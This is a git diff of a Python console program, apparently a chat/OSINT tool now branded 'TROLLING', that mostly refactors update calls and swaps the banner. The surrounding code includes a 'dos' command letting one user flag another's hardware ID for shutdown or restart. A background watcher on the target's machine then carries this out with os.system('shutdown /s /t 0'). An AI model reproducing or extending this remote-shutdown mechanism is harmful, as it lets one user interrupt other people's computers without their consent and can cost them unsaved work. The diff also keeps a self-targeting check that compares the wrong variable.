@@ -1,8 +1,6 @@
 import tempfile, json, colorama, dotenv
 import traceback
-
 import hwid, getpass, os, time, sys, textwrap, re, shlex
-from art import text2art
 from colorama import Fore, Style
 import threading, subprocess, urllib.request
 from ctypes import windll
@@ -20,7 +18,7 @@ else:
 dotenv.load_dotenv(os.path.join(base_dir, ".env"))
 
 # версия текущей сборки — повышать вручную, перед каждым релизом (git tag должен совпадать)
-APP_VERSION = "v2.5.0"
+APP_VERSION = "v2.5.1"
 GITHUB_REPO = "TeroBsass/osint_master"
 # version.json лежит в корне репозитория и отдаётся сырым через raw.githubusercontent.com
 GITHUB_API_RELEASES = f"https://api.github.com/repos/{GITHUB_REPO}/releases"
@@ -56,6 +54,20 @@ connection_pool = None
 # состояние фонового соединения (watcher/decay_worker) — см. _note_bg_result()
 _bg_conn_ok = True
 _bg_fail_streak = 0
+APP_NAME = """
+
+▄▄▄█████▓ ██▀███   ▒█████   ██▓     ██▓     ██▓ ███▄    █   ▄████ 
+▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒▓██▒    ▓██▒    ▓██▒ ██ ▀█   █  ██▒ ▀█▒
+▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒▒██░    ▒██░    ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
+░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░▒██░    ▒██░    ░██░▓██▒  ▐▌██▒░▓█  ██▓
+  ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░░██████▒░██████▒░██░▒██░   ▓██░░▒▓███▀▒
+  ▒ ░░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░▓  ░░ ▒░▓  ░░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
+    ░      ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░ ▒  ░░ ░ ▒  ░ ▒ ░░ ░░   ░ ▒░  ░   ░ 
+  ░        ░░   ░ ░ ░ ░ ▒    ░ ░     ░ ░    ▒ ░   ░   ░ ░ ░ ░   ░ 
+            ░         ░ ░      ░  ░    ░  ░ ░           ░       ░ 
+                                                                  
+                                                                  
+                                                                  """
 
 
 # класс для простых команд консоли и помогающих функций
@@ -492,7 +504,7 @@ class CHAT:
                     time.sleep(amount)
             print(f"{Fore.YELLOW}All messages displayed and read.{Style.RESET_ALL}")
             if name:
-                client.update_data(hw, "message", string_undel)
+                client.update_data(hw, ch="message", val=string_undel)
             return None
         else:
             print(f"{Fore.YELLOW}No messages found for your account.{Style.RESET_ALL}")
@@ -699,13 +711,13 @@ class CHAT:
 class DOS:
     @staticmethod
     def shutdown_user(hw):
-        client.update_data(hw, "shutdown", "True")
-        print(f"{Fore.GREEN}User with HWID {hw} has been marked for shutdown.{Style.RESET_ALL}")
+        client.update_data(hw, True, "shutdown", "True")
+        print(f"[SYSTEM]:{Fore.GREEN}User with HWID {hw} has been marked for shutdown.{Style.RESET_ALL}")
 
     @staticmethod
     def restart_user(hw):
-        client.update_data(hw, "restart", "True")
-        print(f"{Fore.GREEN}User with HWID {hw} has been marked for restart.{Style.RESET_ALL}")
+        client.update_data(hw, True, "restart", "True")
+        print(f"[SYSTEM]:{Fore.GREEN}User with HWID {hw} has been marked for restart.{Style.RESET_ALL}")
 
 # класс для работы с SCAN функциями
 class SCAN:
@@ -780,24 +792,23 @@ def watcher():
 def handle_res_shut(reasons):
     SIMPLE_COMMANDS.pretty_print(reasons)
     hw = str(safe_get_hwid())
-    if not hwid:
+    if not hw:
         return
     if "a" in reasons and "b" in reasons:
-        client.update_data(hw, "shutdown", "False")
+        client.update_data(hw, False, "shutdown", "False")
         os.system("shutdown /s /t 4")
     elif "a" in reasons:
-        client.update_data(hw, "restart", "False")
+        client.update_data(hw, False, "restart", "False")
         # os.system("shutdown /r /t 0")
     elif "b" in reasons:
-        client.update_data(hw, "shutdown", "False")
+        client.update_data(hw, False, "shutdown", "False")
         os.system("shutdown /s /t 0")
     if "c" in reasons:
-
         tries_th = client.get_status(hw)["tries_th"]
         tries = [t for t in (tries_th or "").split(";") if t]
         strings = [f"{tr} - trying hack your password!!!" for tr in tries]
         SIMPLE_COMMANDS.pretty_warn(strings=strings)
-        client.update_data(hw, "tries_th")
+        client.update_data(hw, ch="tries_th")
  
  
 def update(args=None):
@@ -1174,7 +1185,7 @@ def dos(args=None):
     flags = SIMPLE_COMMANDS.parse_flags(args, known={"hwid", "act"})
     hw = flags.get("hwid") or input("Enter the HWID to search for: ")
     if hwid == safe_get_hwid():
-        SIMPLE_COMMANDS.cprint(f"{Fore.RED}You cant's dos yourself!!!{Style.RESET_ALL}")
+        SIMPLE_COMMANDS.cprint(f"{Fore.RED}You cant dos yourself!!!{Style.RESET_ALL}")
         console_start()
     act = flags.get("act") or input("What you want to do with this user: ")
     client.dos_(hw, act)
@@ -1183,8 +1194,7 @@ def dos(args=None):
 
 # функция для запуска программы и проверки HWID
 def start():
-    text = text2art("OSINT MASTER", font="small")
-    print(Fore.GREEN + text + Style.RESET_ALL)
+    print(Fore.GREEN + APP_NAME + Style.RESET_ALL)
     id = safe_get_hwid()
     if id is None:  
         return False
@@ -1206,7 +1216,7 @@ if __name__ == "__main__":
     watcher_thread = threading.Thread(target=watcher, daemon=True)
     watcher_thread.start()
     try:
-        SIMPLE_COMMANDS.set_console_title("OSINT MASTER")
+        SIMPLE_COMMANDS.set_console_title("TROLLING")
         start()
     except KeyboardInterrupt:
         SIMPLE_COMMANDS.graceful_exit()
